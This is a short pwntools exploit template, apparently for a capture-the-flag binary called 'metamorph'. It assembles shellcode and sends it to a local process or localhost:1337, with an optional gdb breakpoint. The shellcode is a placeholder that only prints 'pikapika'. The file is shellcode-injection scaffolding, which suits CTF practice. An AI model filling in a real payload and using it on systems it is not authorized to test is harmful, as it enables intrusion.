#!/usr/bin/env python3

from pwn import *


def attach_gdb(r):
    if args.GDB:
        gdb.attach(
            r,
            gdbscript="""
b * transform
c
        """,
        )


def connect(bin_name):
    if args.REMOTE:
        return remote("localhost", 1337)
    return process(bin_name)


def exploit(e, r):
    # A modifier ;)
    shellcode_asm = """
		mov rax, 1
		mov rdi, 1
		mov rsi, 0x616b6970616b6970
		push rsi
		push rsp
		pop rdx
		mov rsi, rdx
		mov rdx, 8
		syscall
	"""
    shellcode = asm(shellcode_asm)
    r.sendline(shellcode)


# USAGE : python3 template.py [REMOTE] [GDB]
bin_name = "./metamorph"
context.binary = e = ELF(bin_name)
r = connect(bin_name)

attach_gdb(r)
exploit(e, r)
r.interactive()
